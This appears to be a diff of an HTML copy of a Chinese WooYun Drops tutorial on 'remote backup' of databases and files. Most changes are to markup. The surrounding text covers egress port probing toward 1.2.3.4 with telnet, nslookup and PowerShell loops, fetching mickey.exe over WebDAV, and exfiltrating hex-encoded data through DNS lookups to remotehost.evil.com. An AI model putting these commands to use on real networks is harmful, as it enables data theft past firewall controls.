@@ -3,16 +3,16 @@
 			<head>
 			     <title>远程备份数据库和文件的方法 - mickey</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/783">http://drops.wooyun.org/tips/783</a></h1>
 				
       <p>
-        <p>作者：<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9cd1f5fff7f9e5790e10ddf2e8f4eedcc4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+        </p><p>作者：<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9cd1f5fff7f9e5790e10ddf2e8f4eedcc4">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
 
 <h2>Windows</h2>
 
-<hr />
+<hr>
 
 <h3>1.判断什么端口能出来</h3>
 
@@ -21,7 +21,7 @@
 <pre><code>FOR /L %i IN (1,1,65535) DO (cmd /c "start /b telnet 1.2.3.4 %i") 
 </code></pre>
 
-<p>用TELNET不停的连接你的1-65535端口,你本地开个TCPDUMP就行了,如果连通了,就OK了.<br />
+<p>用TELNET不停的连接你的1-65535端口,你本地开个TCPDUMP就行了,如果连通了,就OK了.<br>
 如果TCP封锁了,可以用UDP</p>
 
 <pre><code>FOR /L %i IN (1,1,65535) DO (cmd /c "start /b nslookup -port=%i wooyun.org 1.2.3.4") 
@@ -38,7 +38,7 @@
 <pre><code>function sT($IP,$Port) {$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try { $sock.Connect($End);[Byte[]] $Message = [char[]]"w00tw00t";$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)} catch {};$Sock.Close();};1..65535 | %{ sT -IP "1.2.3.4" -Port $_ } 
 </code></pre>
 
-<p></br></p>
+<p><br></p>
 
 <pre><code>function sU($IP, [int]$Port){$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = "w00tw00t";$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);}; 1..65535 | %{ sU -IP "1.2.3.4" -Port $_ } 
 </code></pre>
@@ -146,11 +146,11 @@ copy z:\mickey.exe C:\mickey.exe
 <pre><code>net start WebClient 
 </code></pre>
 
-<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a7431f2c4e3a05413f08e6c9d3cfd5e7ff402e3c403d23">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>,主攻LINUX</p>
+<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a7431f2c4e3a05413f08e6c9d3cfd5e7ff402e3c403d23">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>,主攻LINUX</p>
 
 <h2>Linux</h2>
 
-<hr />
+<hr>
 
 <p>当我们想要把一个服务器里面的数据打包备份到另一个服务器的时候，这些命令可能会有帮助。</p>
 
@@ -205,7 +205,7 @@ copy z:\mickey.exe C:\mickey.exe
     while read line; do host $line.domain.com remotehost.evil.com; done 
 </code></pre>
 
-<p>把打包后的数据用16进制编码，每行16字节，这样在通过dns发送到时候就不会因为超长导致出错。然后我们限制每次只发送1个ping数据包，减少发送时间。至于怎么还原，那就要看你的了。</p>      </p>
+<p>把打包后的数据用16进制编码，每行16字节，这样在通过dns发送到时候就不会因为超长导致出错。然后我们限制每次只发送1个ping数据包，减少发送时间。至于怎么还原，那就要看你的了。</p>      <p></p>
     
 			</body>
 		</html>
